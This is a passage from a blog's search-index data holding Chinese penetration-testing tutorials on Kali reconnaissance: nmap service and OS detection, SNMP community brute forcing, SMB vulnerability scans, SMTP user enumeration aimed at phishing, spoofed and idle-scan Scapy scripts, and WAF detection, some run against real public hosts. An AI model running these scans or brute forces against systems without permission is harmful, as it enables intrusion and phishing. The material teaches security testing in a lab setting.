发送错误Checksum字段，用来欺骗防火墙&#x2F;IDS设备\n\n\n\n\n\n\n\n杂项\n\n-6   # 扫描IPv6\n-A   #  OS检测，version检测，script扫描和路由追踪组合\n\n\n\n","slug":"Kali渗透测试-nmap专题","date":"2022-12-14T12:57:43.000Z","categories_index":"信息搜集","tags_index":"信息搜集,Kali","author_index":"Aurora"},{"id":"0a2dd6f4d852060b39241e4c81614177","title":"Kali渗透测试-主动信息搜集【服务扫描】","content":"服务扫描\n\n\n\n\n\n\n\n\n\n识别开放端口上运行的应用\n识别目标操作系统\n提高攻击效率\nBanner捕获\n最简单，最不可靠，Banner信息可被管理员修改或删除，迷惑扫描者\n\n\n服务识别\n操作系统识别\nSNMP分析\n简单网络管理协议\nCommunity strings\n信息查询或重新配置\n\n\n防火墙识别\n\n\n\nBanner信息\n\n\n\n\n\n\n\n\n\n软件开发商\n\n软件名称\n\n服务类型\n\n版本号\n\n直接发现已知的漏洞和软点\n\n\n连接建立后直接获取banner信息\n\nApache，Tomcat，版本号等\n\n\n另类服务识别方法\n\n特征行为和响应字段\n不同的响应可用于识别底层操作系统\n\n\n\nNc\nnc -nv 1.1.1.1 25\n\n\n\n\n\n\n\n\n\n\n\n\n通过连接目标机的22端口，可以发现使用的OpenSSH软件包，Debian-ubuntu下的操作系统\n\n\n\nnc -nv 1.1.1.1 80\n\n通过使用get来获取80端口banner信息\n\n\n\n\n\n\n\n\n\n\n\n\n得到帐号密码，后续可以猜解其他密码\n\n\n\n\n\n\nPython\nPython socket\n\nSocket模块用于连接网络服务\n\n\n\n\n\n\n\n\n\n\n\n\n首先导入socket库，定义一个banner变量，用于TCP的连接，socket.AF_INET : IPv4 ; socket.SOCK_STREAM : 流式socket , for TCP，connect()方法用于连接目标主机，recv()方法接收4096B的数据，得到banner信息vsftpd：版本2.3.4\n\nimport socketbanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)banner.connect((&quot;192.168.216.167&quot;,21))banner.recv(4096)banner.close()exit()\n\n\n\n有些Banner信息不允许抓取，recv()函数无返回将挂起\n\n\n\n\nDmitry\ndmitry -pb 1.1.1.1\n-p进行TCP扫描，-b进行端口banner信息的扫描\n\n\n\n\n\nNmap\nnmap -sT 1.1.1.1 -p1-100 –script&#x3D;banner\nnmap是通过脚本来获取banner信息；banner信息只能通过完整连接的方式进行获取，使用参数-sT，nmap脚本使用的语言是lua\n\n\n\n\n\nAmap\n\n\n\n\n\n\n\n\namap专门用来发现开放端口后面跑什么服务信息，其中-B参数专门用来发现端口上的banner信息\n\namap -B 1.1.1.1 1-100\n可指定端范围也可单个端口扫描\n\n\n\n\n\n服务识别\n\n\n\n\n\n\n\n\n\nBanner信息抓取能力有限\nnamp响应特征分析识别服务\n发送系列复杂的探测\n依据响应特征signature\n\n\nnc -nv 1.1.1.1 80\nnmap 1.1.1.1 -p 80 -sV\n\nNmap\nnmap通过特征来识别目标端口跑的到底是什么服务\n\nnmap 192.168.216.167 -p1-100 -sV  \n\n\n\n\n\n\n\n\n\n\n-sV 用来识别端口后面跑具体是什么服务，不单单会扫描到banner信息\n\n\n\n\n\n\n\n\n\n\n\n53端口之前的工具都没有识别到具体的banner信息，通过nmap -sV扫描出是domain服务，并且http服务是由Apache和Ubuntu搭建，此时扫描的结果准确度和真实性要比banner信息高\n\n\n\n\n\n\nAmap\n\n\n\n\n\n\n\n\n基于特征信息的扫描\n\namap 192.168.216.167 1-100 \n\n\n扫描结果很乱，加参数-q，发现协议信息\n\namap 192.168.216.167 1-100  -q\n\n\namap 192.168.216.167 1-100  -qb   # -b参数打印banner信息\n\n\n\n\n\n\n\n\n\n\n\namap相比于nmap，扫描的结果还是基于banner信息，具体信息不够全面\n\n\n\n\n\n\n操作系统识别\n\n\n\n\n\n\n\n\n\nTTL起始值\nWindows：128（65—128）\nLinux&#x2F;Unix：64（1—64）\n某些Unix：255\n\n\n\n通过TTL值判断操作系统类型；\nTTL值可被修改，迷惑扫描者。\nPython\n使用脚本利用TTL值判断操作系统\n\n#!/usr/bin/python\nfrom scapy.all import*\nimport logging\nlogging.getLogger( \"scapy.runtime\" ).setLevel(logging.ERROR)\nimport sys\n\nif len( sys.argv ) !=2:\n   print(\"Usage - ./ttl_os.py [IP adress]\")\n   print(\"Example - ./ttl_os.py 1.1.1.1\")\n   print(\"Example will preform ttl analysis to attemptto determine whether the systems is Windows or Linux/Unix\")\n   sys.exit()\n\nip = sys.argv[1]\n\nans = sr1(IP(dst=str(ip))/ICMP(),timeout=1,verbose=0)\n\nif ans == None:\n       print(\"No response was returned\")\nelif int(ans[IP].ttl)&lt;=64:\n       print(\"Host is Linux/Unix\")\nelse:\n       print(\"Host is Windows\")\n\nNmap\n\n\n\n\n\n\n\n\n基于多种方式进行判断目标操作系统\n\nnmap -O 192.168.216.167\n\n-O参数专门用于检测操作系统\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n检测出Linux版本是在2.6.9-2.6.33之间，之后可以去查找这个版本之间存在的漏洞\nCPE：每种设备都会进行CPE编号\n\n\n\n\n\n\np0f\n\n\n\n\n\n\n\n\n\n基于被动式的操作系统识别\n\n结合ARP地址欺骗识别全网OS\n\n\n\np0f\n\n\n\n\nSNMP扫描\n\n\n\n\n\n\n\n\n\nsnmp\n信息的金矿\n可以查看到设备非常详细的内容\n\n\n经常被错误配置\npublic&#x2F;private&#x2F;manager\ncommunity：登录证书，容易被管理员遗忘修改其特征字符\n可用字典爆破\n\n\n\n\nMIB Tree\nSNMP Managerment Information Base（MIB）\n有些厂商有自己的MIB库\n\n\n树形的网络设备管理功能数据库\n1.3.6.1.4.1.77.1.2.25\n\n\nonesixtyone 1.1.1.1 public\nonesixtyone -c dict.txt -i hosts -o my.log -w 100\n-i参数表示添加主机列表，单个主机不需要加-i参数\n\n\nSNMP基于明文传输，也可使用网络嗅探工具进行嗅探\n\nOnesixtyone\nonesixtyone 1.1.1.1 public\n\n\n\n\nonesixtyone -c &#x2F;usr&#x2F;share&#x2F;doc&#x2F;onesixtyone&#x2F;dict.txt 192.168.216.157 -o my.log -w 100\n\n\n使用字典扫描出目标系统的community为public\n\n\n\nSnmpwalk\nsnmpwalk 192.168.216.157 -c public -v 2c \n\n-c参数指定community，-v参数指定SNMP的版本，（SNMP现在有三个版本）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n前面的数字表示MIB编号，可用于查询MIB库文件；查询出：主机名，MAC地址，IP地址，盘符及序列号，系统进程，系统目录等；（其中IP地址也可查询到与目标主机通信的其他主机IP）\n\n\n\n\n\nnmpwalk -c public -v 2c 192.168.216.157 1.3.6.1.4.1.77.1.2.25\n\n\n\n\n\n\n\n\n\n\n查询某个具体的OID信息（OID：1.3.6.1.4.1.77.1.2.25）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n查询出系统的账号信息\n\n\n\n\n\n\nSnmp-check\n\n\n\n\n\n\n\n\n-t参数用于探测SNMP\n\nsnmp-check  1.1.1.1\n\n\n\n\n\n\n\n\n\n\n\n\n相对于snmpwalk，snmp-check的信息更加明确，同样可以检测出：主机名，MAC地址，IP地址，盘符及序列号，系统进程，系统目录等；（其中IP地址也可查询到与目标主机通信的其他主机IP\n\n\n\nsnmp-check 1.1.1.1 -w\n\n\n\n\n\n\n\n\n\n\n-w参数检测可写权限\n\n\n\n\n\n\n\nSMB扫描\n\n\n\n\n\n\n\n\n\nServer Message Block 协议\n\n微软历史上出现安全问题最多的协议\n\n实现复杂\n\n默认开放139，445端口\n\n文件共享\n\n通过SMB协议实现\n\n\n空会话未身份验证访问（SMB1.0版本）\n\n不需要身份验证就可以和目标系统建立空连接\n\n可获取以下信息\n\n密码策略\n\n‘用户名\n\n组名\n\n机器名\n\n用户、组SID\n\n\n\n\n\n\n\n\nSMP扫描是针对一个目标机器发现其漏洞。\nNmap\nnmap -v -p139,445 192.168.216.0&#x2F;24\n\n-v参数表示显示详细结果和内容\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n扫描192.168.216.0&#x2F;24这个网段可以扫描出存活主机开放的139和445端口\n\n\n\n--open参数只查看端口开放的主机\n\n\n\n\n\n\n\n\n\n\n\n\nlinux主机安装Samba等服务也会开启139和445端口，单纯扫描出来的结果无法判断是windows还是linux\n\n\n\n\n\nnmap 192.168.216.157 -p139,445 –script&#x3D;smb-os-discovery.nse\n\n使用nmap脚本扫描139和445端口以及发现OS信息\n\n\n\n\n\nnmap -v -p139,445 –script&#x3D;smb-vuln-*.nse –script-args&#x3D;unsafe&#x3D;1 192.168.216.157\n\n\n\n\n\n\n\n\n\n\n使用nmap脚本识别开放的端口上是否打了所有的补丁，是否存在漏洞，是否存在未打的补丁；smb-check-vulns脚本检查已知的SMB相关的漏洞，为此脚本中的unsafe参数指定为1：unsafe=1是整个参数赋值给--script-args；unsafe=1是对系统造成破坏的扫描；safe=1是对系统进行非破坏性的扫描。\n\n\n\n\n\n\n\n\n\n\n由于从NMAP 6.49beta6开始，smb-check-vulns.nse脚本被取消了。它被分为smb-vuln-conficker、•smb-vuln-cve2009-3103、smb-vuln-ms06-025、smb-vuln-ms07-029、smb-vuln-regsvc-dos、smb-vuln-ms08-067这六个脚本。用户根据需要选择对应的脚本。如果不确定执行哪一个，可以使用smb-vuln-*.nse来指定所有的脚本文件，进行全扫描。\n\n\n\n\n\n\n\n\n\n\nsmb-vuln-*.nse系列的脚本专门用于检测windows中的SMB服务漏洞，不适用于linux\n\n\n\n\n\n\n\n\n\n\n\n\n扫描出一个有漏洞的结果，后续可以进行验证再利用\n\n\n\n\n\nnmap -v -p139,445 –script&#x3D;smb-vuln-*.nse –script-args&#x3D;unsafe&#x3D;1 192.168.216.157 -Pn\n\n\n\n\n\n\n\n\n\n\n-Pn参数目标机开启防火墙也可继续扫描\n\n\n\n\n\n\n\n\nNbtscan\nnbtscan -r 192.168.216.0&#x2F;24\n\n优点：支持跨网段扫描\n\n-r参数使用137端口进行扫描，兼容性比较好\n\n\n\n\n\n\n\nEnum4linux\n\n\n\n\n\n\n\n\n在linux上枚举出windows系统，不支持网段扫描\n\nenum4linux -a 192.168.216.157\n\n枚举出的信息很全面\n\n\n\n\n\n\n\n\n\n\n\n\n扫描出主机信息以及开启的服务\n\n\n\n\n\n\n\n\n\n\n\n\n192.168.216.157允许建立空连接\n\n\n\n\n\nenum4linux -a 192.168.216.167\n\nOS信息\n\n\n\n\n用户信息\n\n\n\n\n\n共享服务\n\n\n\n\n\n密码策略信息\n\n\n\n\n主机的SID及用户的RID\n\n\n\n\n\n\n\n\n\n\n\n\nAdministrator账号的RID永远都是500，即使修改为其他名字也是500，只要识别出500就是Administrator用户\n\n\n\n\n\n\nSMTP扫描\n\n\n\n\n\n\n\n\n针对目标系统发现邮件账号信息，后续进行社工发送钓鱼邮件等等。\n\n扫描SMTP\n发现邮件账号\n社会工程学\n钓鱼邮件\n\n\n\nNc\nnc -nv 192.168.216.157 25        # 连接25端口\n使用VRFY方式尝试root用户连接\n\n\n\n\n\n\nNmap\nnmap smtp.163.com -p25 –script&#x3D;smtp-enum-users.nse –script-args&#x3D;smtp-enum-users.methods&#x3D;{VRFY}\n\n\n\n\n\n\n\n\n\n\nsmtp-enum-users.nse枚举用户的脚本，其脚本参数smtp-enum-users.methods指定使用什么方式进行枚举，这里使用的是{VRFY}方式，默认用root账号，也可加别的参数（指定字典）\n\n\n\n\n\n\nsmtp-user-enum -M VRFY -U users.txt -t 192.168.216.167\n\n使用字典枚举用户\n\n\n\n\n\n\n邮件开放中继\n\n\n\n\n\n\n\n\n如果开放了邮件中继，所有人都可以使用该邮件服务器，该邮件服务器就可以被当作肉鸡进行后续工作\n\nnmap smtp.163.com -p25 –script&#x3D;smtp-open-relay.nse\n\n\n\n\n防火墙识别\n\n\n\n\n\n\n\n\n\n通过检查回包，可能识别端口是否经过防火墙过滤\n设备多种多样，结果存在一定 误差\n被过滤的端口，不是防火墙上的端口，而是内部主机向外发起请求的临时端口\n\n\n\n\n\n\n\n\n\n\n\n第一种情况：先发送一个SYN包，对方没有回应（No），再发一个ACK包，对方回应RST，判断防火墙过滤规则为Filtered；\n第二种情况：先发送一个SYN包，对方回应SYN+ACK或者SYN+RST；再发一个ACK包，对方没有回应，判断防火墙过滤规则为Filtered；\n第三种情况：先发送一个SYN包，对方回应SYN+ACK或者SYN+RST；再发送一个ACK包，对方回应RST包，这种情况有可能没有过滤（Unfiltered&#x2F;Open）；\t\n第四种情况：先发送一个SYN包，对方没有回应；再发一个ACK，对方还没有回应；这种情况判断为端口是关闭状态，防火墙不允许访问，端口也没有开放。\nPython\n使用Python脚本识别防火墙\n\n\n\n\n\n#!/usr/bin/python\n\nfrom scapy.all import*\nimport logging\nlogging.getLogger( &quot;scapy.runtime&quot; ).setLevel(logging.ERROR)\nimport sys\n\nif len( sys.argv ) !=3:\n   print(&quot;Usage - ./Firewalk_scan.py [Target.IP] [Target Port]&quot;)\n   print(&quot;Example - ./Firewalk_scan.py 1.1.1.1 443&quot;)\n   print(&quot;Example will determine if filtering exists on port 443 of Host 1.1.1.1&quot;)\n   sys.exit()\n\nip = sys.argv[1]\nport = int(sys.argv[2])\n\nACK_response = sr1(IP(dst=ip)/TCP(dport=port,flags=&quot;A&quot;),timeout=1,verbose=0)\nSYN_response = sr1(IP(dst=ip)/TCP(dport=port,flags=&quot;S&quot;),timeout=1,verbose=0)\n\nif ((ACK_response == None) or (SYN_response == None)):\n   print(&quot;Port is either unstatefully filtered or host is down&quot;)\nelif ((int(ACK_response[TCP].flags) == 4) or (SYN_response == None)) and not ((ACK_response == None) and (SYN_response == None)):\n   print(&quot;Stateful filtering in place&quot;)   \nelif int(SYN_response[TCP].flags) == 18:\n   print(&quot;Port is unfiltered and open&quot;)\nelif int(SYN_response[TCP].flags) == 20:\n   print(&quot;Port is unfiltered and closed&quot;)\nelse:\n   print(&quot;Unable to determine if the port is filtered&quot;)\n\n\n\n\n\nNmap\n\n\n\n\n\n\n\n\n通过发送ACK包查看回应包，对应表中4种情况，查看对应的是什么规则\n\nnmap -p22 192.168.216.167 -sA\n\n\n\n\n负载均衡识别\n\n\n\n\n\n\n\n\n\n广域网负载均衡\n通过DNS轮询，进行负载均衡\n\n\n服务器负载均衡(HTTP-Loadbalancing)\nNginx\nApache\n\n\n\nLbd\nlbd www.baidu.com\n\n\n\n\n\n\n\n\n\n\n\n\n存在广域网负载均衡；服务器负载均衡为bfe，BFE为应用层负载均衡引擎\n\n\n\nlbd mail.163.com\n\n\n\n\n\n\n\n\n\n\n\n\n服务器负载均衡为nginx；没有检测到广域网负载均衡\n\n\n\n\nWAF识别\n\n\n\n\n\n\n\n\nWEB应用防火墙\nWafw00f\nwafw00f -l\n\n\n\n\n\n\n\n\n\n\n\n\n-l参数查看可检测的已知WAF\n\n\n\nwafw00f http://www.baidu.com\n\n\n\n\n\nNmap\nnmap www.baidu.com –script&#x3D;http-waf-detect.nse\n\n\n\n\n","slug":"Kali渗透测试-主动信息搜集【服务扫描】","date":"2022-12-13T01:59:23.000Z","categories_index":"信息搜集","tags_index":"信息搜集,Kali","author_index":"Aurora"},{"id":"c561906c2b22af98a524983174fdc348","title":"Kali渗透测试-主动信息搜集【端口扫描】","content":"端口扫描—UDP\n\n\n\n\n\n\n\n\n二三四层发现的目的只是为了准确发现所有活着主机IP，确定攻击面，端口扫描即发现攻击点，发现开放端口。端口对应网络服务及应用端程序，服务端程序的漏洞通过端口攻入。\n\nUDP端口扫描\n假设ICMP prot-unreachable响应代表端口关闭\n目标系统不响应ICMP prot-unreachable时，可能产生误判\n\n\n完整的UDP应用层请求\n准确性高\n耗时巨大\n\n\n\n\n\nScapy UDP Scan使用一台靶机用来测试\n\n\n端口关闭：ICMP prot-unreachable\n\n\n\n\n端口开发：没有回包\n\n\n\n\n\n\n与三层相同的技术\n\n存在误判\n\n69、70等端口同样没有回包，但端口未开放\n\n\n\n\n\nUDP_Scan扫描脚本\n#!/usr/bin/python\n\nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\nfrom scapy.all import*\nimport time\nimport sys\n\nif len( sys.argv ) !=4:\n   print (\"Usage - ./udp_scan.py [Target.IP] [First Port] [Last Port]\")\n   print (\"Example - ./udp_scan.py 1.1.1.1 1 100\")\n   print(\"Example will UDP port scan ports 1 through 100 on 1.1.1.1\")\n   sys.exit()\n\nip=sys.argv[1]\nstart=int(sys.argv[2])\nend=int(sys.argv[3])\n\nfor port in range(start,end):\n  a=sr1(IP(dst=ip)/UDP(dport=port),timeout=5,verbose=0)\n  time.sleep(1)       # 防止扫描过快\n  if a==None:\n     print(port)\n  else:\n     pass\n\nNmap—UDP\nnmap -sU 1.1.1.1\n\n默认有1000个常用端口\n按下回车可以查看扫描进度，状态以及时间\n\n\n\nICMP host-unreachable\n\n\nnmap -sU 1.1.1.1 -p53&#x2F;161\n\n指定端口扫描\n\n\n\nnmap -sU 1.1.1.1 -p-          # -直接就表示1-65535个端口，全部扫描\n\n\n\n端口扫描—TCP\n\n\n\n\n\n\n\n\nTCP端口扫描\n\n基于连接的协议\n三次握手\n隐蔽扫描\n扫描会产生大量流量，防止被入侵检测设备探测到，使用隐蔽扫描\n\n\n僵尸扫描\n比隐蔽扫描更加隐蔽\n\n\n全连接扫描\n建立完整连接进行扫描，不够隐蔽，容易被发现\n\n\n所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态\n\n\n隐蔽扫描—syn\n\n\n\n\n\n\n\n\n\n\n只发syn包，若是端口开放，会收到ack包；若是端口未开放，会收到rst包；最后一个三次握手的ack包，扫描发起方就不会发送，这样就没有建立完整的TCP连接，目标系统的应用层日志中没有任何记录，但是网络层会有一些痕迹。这中扫描比较隐蔽\n\n不建立完整连接\n应用日志不记录扫描行为—隐蔽\n\n\n僵尸扫描\n\n\n\n\n\n\n\n\n\n\n扫描发起方和被扫描目标系统之间的网络必须是可以实现地址伪造，\n\n极度隐蔽\n\n实施条件苛刻\n\n可伪造源地址\n\n选择僵尸机\n\n闲置系统：一个足够闲置 ，并且不和除了我们之外的任何其他机器进行网络通信的主机\n系统使用递增的IPID：IPID必须是递增的，0和随机都不可以。然而现在大部分主流的OS的IPID都是随机产生的，但是早期的xp，比如xp200，xp2003都是递增的IPID。\n\n\n\n\n\n\n\n\n\n\n\n\n僵尸扫描一共有三方，扫描者，僵尸机，被扫服务器\n实现过程：\n\n第一步：扫描发起者向僵尸机发送一个SYN+ACK的数据包(发送之前未建立连接，直接发送SYN+ACK)，正常情况下僵尸机会返回一个RST包，这个RST包中会有IPID字段，假设IPID字段值为x，扫描这就会收到x\n第二步：扫描者向目标服务器发送SYN包，这个包需要伪造源地址；扫描者就将数据包的源IP伪造成僵尸机的IP，此时被扫的服务器收到数据包IP是僵尸机的IP，实际上是扫描者伪造源地址发送的；若目标服务器收到SYN包，且端口是开放的状态，目标服务器就会向僵尸机发送一个SYN+ACK的包；此时，僵尸机又收到一个目标服务器发送的SYN+ACK的包，同样也是未建立连接的SYN+ACK包，僵尸机就会向目标服务器发送一个RST包，这个RST包是继上次给扫描者发送的RST包的第二个RST包，此时的IPID就是x+1；（僵尸机必须足够闲置，从未有过IP通信，否则无法实现僵尸扫描）目标服务器就会收到这个IPIP&#x3D;x+1的包，这个过程中扫描者完全隐蔽\n第三步：扫描者再向僵尸机发送一个SYN+ACK的包，僵尸机又给扫描者发送第三个RST包，此时的IPID&#x3D;x+2；如果这时扫描者收到的IPID值为x+2，那么扫描者就可以判断目标服务器的目标端口就是开放的状态\n\n\n\n\n\n\n\n\n\n\n\n\n假设端口是未开放状态，\n\n第一步：同上\n第二步：同样伪造僵尸机IP给目标服务器发SYN包，由于端口未开放，目标服务器就会给僵尸机发送一个RST包，僵尸机收到RST包后不会给目标服务器返回任何数据包\n第三步：扫描者再次向僵尸机发送一个SYN+ACK包，此时扫描者收到的IPID值为x+1，就表示第二步通信过程中目标服务器没有给僵尸机发送SYN+ACK包，僵尸机也没有给目标服务器发送RST包，\n\n\n\n\n\n隐蔽端口扫描\n\n\n\n\n\n\n\n\nScaner发送syn—Target接收syn&#x2F;ack—Scaner返回rst  \n建立不完整连接\nScapy\n对目标机发送SYN包\n\na&#x3D;sr1(IP(dst&#x3D;”192.168.216.167”)&#x2F;TCP(flags&#x3D;”S”),timeout&#x3D;1, verbose&#x3D;0)\n\n\n\n\n\n\n\n\n\n\n\n\n目标系统返回flags=SA，表示返回一个SYN/ACK包，默认扫描到端口80开放\n\n\n\n\n\n\n\n\n\n\n\n\n第一个包是扫描者向目标系统发送一个SYN包，目标系统接收到SYN包之后响应SYN&#x2F;ACK包，第三个包不是scapy给目标系统返回的RST包，而是由于操作系统内核产生，在操作系统内核看来SYN&#x2F;ACK包是一个无来由不正常的包，会自行产生一个RST包。\n\n\n\n\n\n扫描不开放的端口\n\na&#x3D;sr1(IP(dst&#x3D;”192.168.216.167”)&#x2F;TCP(flags&#x3D;”S”,dport&#x3D;2222),timeout&#x3D;1, verbose&#x3D;0)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n会受到一个RST&#x2F;ACK的包，表示目标机是存活状态，但端口未开放\n\n\n\n\n\n使用脚本扫描端口\n\n\n#!/usr/bin/python\nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\nfrom scapy.all import*\nimport time\nimport sys\n\nif len( sys.argv ) !=4:\n   print(\"Usage - ./udp_scan.py [Target.IP] [First Port] [Last Port]\")\n   print(\"Example - ./udp_scan.py 1.1.1.1 1 100\")\n   print(\"Example will TCP SYN scan ports 1 through 100 on 1.1.1.1\")\n   sys.exit()\n\nip=sys.argv[1]\nstart=int(sys.argv[2])\nend=int(sys.argv[3])\n\nfor port in range(start,end):\n  a=sr1(IP(dst=ip)/TCP(dport=port),timeout=1,verbose=0)\n  time.sleep(1)          #防止因扫描过快，造成误判\n  if a==None:\n     pass\n  else:\n      if int(a[TCP].flags==18):\n          print(port)\n    \n      else:\n          pass\n\n\n\nNmap\nnmap -sS 1.1.1.1 -p1-100\n\n\n\n\n\n\n\n\n\n\n-sS 进行扫描，使用SYN方式\n\n\n\n\n\n\n只显示open状态的 端口\n\nnmap -sS 1.1.1.1 -p1-100 –open\n\n\n\n\n\n端口不连续\n\nnmap -sS 1.1.1.1 -p 80,21,22,25,110,443\n\n\n\n\n\n\n\n\n\n\n\n\n端口状态为filtered表示端口是过滤状态\n\n\n\n\n\nnmap -sS -iL iplist.txt -p 80,21,110,443\n\n\n\n\n\n\n\n\n\n\n可以使用地址列表进行扫描\n\n\n\nhping3\nhping3 1.1.1.1 –scan 80 -S\n\n\n可加-V参数进行全端口显示\n\n\n\n\n\nhping3 1.1.1.1 –scan 0-65535 -S\n\n\n\n\n\n\n\n\n\n\n全端口扫描\n\n\n\nhping3地址欺骗扫描\n\nhping3 -c 10 -S –spoof 192.168.216.170 -p ++1 192.168.216.167 \n\n\n\n\n\n\n\n\n\n\nhping3先发送10个包，-S表示使用SYN包发送，–spoof表示欺骗，用来伪造源地址，++1表示每次从1号端口开始进行每次+1个端口进行扫描\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n这样伪造源地址的扫描方式，可以进行扫描，但是目标机进行回包的时候是给伪造的地址进行回复的包，因此扫描机不会看到任何回复包。若要查看回复包，需要有权登录伪造地址的主机进行抓包查看扫描结果；若有权控制网络交换机，可以做镜像端口，可以把目标机IP端口的所有流量可以镜像到扫描机，查看分析所有的包，得到扫描结果。\n\n\n\n\n全连接端口扫描\n\n\n\n\n\n\n\n\nSYN扫描在某种特别严格的网络服务器下或者防火墙过滤下，极其特殊性的情况下，SYN包扫描无法探测目标端口是否开放，需要使用全连接端口扫描，能够建立三次握手，结果更加准确，但不够隐蔽，容易触动网络层的入侵检测。\n在特殊情况下的才会使用全连接端口扫描\nScapy\n\n\n\n\n\n\n\n\n缺点：\n\nSYN扫描不需要raw packets\n内核认为SYN&#x2F;ACK是非法包，直接发RST中断连接\n全连接扫描对scapy比较困难\n\n\n使用脚本进行全连接扫描\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n三次握手的包可以发送出去，但并由于系统的原因没有成功的进行三次握手连接：\n第一个SYN包发送给目标机之后会收到SYN+ACK包，之后扫描机会发送给目标机一个RST包，1.166拒绝连接，然后脚本又会发送一个ACK包（强制发送一个ACK包），最后目标系统返回一个RST包。\n此时我们是想要建立连接，那么就需要将第一个RST包解决掉，之后发送的ACK包就合情合理不会收到最后一个RST包，就代表成功建立连接。\n\n\n\n通过linux自带的iptables将操作系统内核产生向目标IP发送的RST包进行DROP掉\n\n\n\n\n\n\n\n\n\n\n由于iptables工作在操作系统非常底层的位置，它的工作位置是在操作系统内核之前，也就是目标机器返回的包会先经过iptables的过滤，内核出去的包也会经过iptables的过滤\n\n命令：iptables -A OUTPUT -p tcp –tcp-flags RST RST -d  192.168.216.167 -j DROP\n#!/usr/bin/python\nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\nfrom scapy.all import*\n\nSYN=IP(dst=\"192.168.216.167\")/TCP(dport=25,flags=\"S\")\n\nprint(\"-- SENT --\")\nSYN.display()\n\nprint(\"\\n\\n-- REVEIED\")\nresponse=sr1(SYN,timeout=1,verbose=0)\nresponse.display()\n\nif int(response[TCP].flags)==18:\n   print(\"\\n\\n-- SENT --\")\n   A=IP(dst=\"192.168.1.167\")/TCP(dport=25,flags=\"A\",ack=(response[TCP].seq+1))\n   A.display()\n   print(\"\\n\\n-- RECEIVED --\")\n   response2=sr1(A,timeout=1,verbose=0)\n   response2.display()\nelse:\n   print(\"SYN-ACK not returned\")\n\n\n\nnmap\nnmap -sT 1.1.1.1 -p1-100\n-sT 表示全连接的扫描\n\n\n\n\n\n\ndmitry\n\n\n\n\n\n\n\n\n\n功能简单，但使用简便\n\n默认扫描150个最常用的端口\n\n\n\ndmitry -p 1.1.1.1\n\n\n\n\ndmitry -p 1.1.1.1 -o output\n\n\n\n\n\n\n\n\n\n将结果输出到一个文本文件中\n\n\nnc\nnc -nv -w 1 -z 192.168.216.167 1-100\n\nn表示数字不做域名解析；v表示详细内容，-w 1表示对目标端口超时时间；-z表示要做扫描\n\n\n\n\n\n\n\n僵尸扫描\n\n\n\n\n\n\n\n\n僵尸机：win7 192.168.216.157\n目标机：metasploitable2 192.168.216.167\n扫描机：Kali\nScapy—zombie.py\n先定义IP和TCP包头：\n\n定义向僵尸机发送的包rz，向目标机发送的包rt：\n\n\n定义向僵尸机发送的包的内容：\n\n\n\n\n\n\n\n\n\n定义向僵尸机发送的IP地址，必须要给僵尸机定义一个目标端口，返回RST时才会返回IPID，445端口windows默认开启，定义TCP的flags字段为SYN+ACK\n\n\n定义向目标机发送的包内容：\n\n\n\n\n\n\n\n\n\n定义源IP为僵尸机IP，用于伪造地址，\n定义目的IP，扫描目标系统\n定义目的端口\n定义TCP的flags字段发送SYN包\n\n\n\n\n先向僵尸机发送rz包，再向目标机发送rt包，最后再向僵尸机发送rz包，最终比较向僵尸机发送的包的IPID值。\n\n第一步：向僵尸机发送rz包\n\n\n\n\n第二步：向目标机发送rt包，由于是伪造IP发包，需要设置timeout值\n\n\n\n\n第三步：再向僵尸机发送rz包\n\n\n\n\n最后比较两个包的id值\n\n\n\n\n\n\n\n\n\n\n\n\naz1包中的id&#x3D;162，az2包中的id&#x3D;164，代表IPID&#x3D;x+2，目标机25端口开放\n\n\n\n\n\n测试端口未开放的ipid值\n\n将目标端口修改为33445\n\n\n\n\n接着发送三个包，比较id值\n\n\n\n\n\n\n\n\n\n\n\n\naz1包的id值为171，az2包的值为172，表示IPID&#x3D;x+1，目标机33445端口未开放\n\n\n\n\n\n\n注意：僵尸扫描期间僵尸机不能产生任何其他的TCP流量通信，否则无法判断IPID的值，进而导致无法判断端口是否开放\n\n通过脚本进行僵尸扫描\n\n\n#!/usr/bin/python\n#-*-coding:utf-8-*-\nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\nfrom scapy.all import *\n\ndef ipid(zombie):#定义一个ipid函数，同时定义一个zombie变量。该函数的作用是探测一主机是否可以作为僵尸机\n  reply1 = sr1(IP(dst=zombie)/TCP(flags=\"SA\"), timeout=2,verbose=0)#向zombie发送一个syn/ack包\n  send(IP(dst=zombie)/TCP(flags=\"SA\"),verbose=0)#send()与sr1()方法的区别是:sr1发送出去一个包以后会在接收对方的一个回包，而send方法不会接收包\n  reply2 = sr1(IP(dst=zombie)/TCP(flags=\"SA\"),timeout=2,verbose=0)#紧接着在向僵尸机发送一个syn/ack包\n  if reply2[IP].id == (reply1[IP].id+2):#根据发送的三个来判断僵尸机是否足够空闲,并且ipid序号是否为递增的。\n    print(\"IPID secquence is incremental and target appears to be idle,ZOMBIE LOCATED\")\n    response = input(\"Do you want to use this zombie to perform a scan?(Y or N):\")\n    if response == \"Y\": #是否使用该僵尸机执行扫描\n      target = input(\"Enter the IP address of the target system:\") #输入要扫描的目标主机ip\n      zombiescan(target, zombie)\n  else:\n    print(\"Either the IPID secquence is not incremental or the target if not idle. NOT A Good zombie\")\n\ndef zombiescan(target, zombie):\n  print(\"\\nScanning target\"+target+\"with zombie\"+zombie)\n  print(\"\\n-------Open Ports On Target-----\\n\")\n  for port in range(1,100):#扫描目标1-100的端口\n    try:\n      start_val = sr1(IP(dst=zombie)/TCP(flags=\"SA\",dport=port),timeout=2,verbose=0)\n      send(IP(src=zombie,dst=target)/TCP(flags=\"S\",dport=port),verbose=0)\n      end_val = sr1(IP(dst=zombie)/TCP(flags=\"SA\"),timeout=2,verbose=0)\n      if end_val[IP].id == (start_val[IP].id+2):\n        print(port)\n    except:\n      pass\n\n#主函数内容\nprint(\"------Zombie Scan Suite------\\n\") #这是僵尸扫描套件程序\nprint(\"1.----Identity 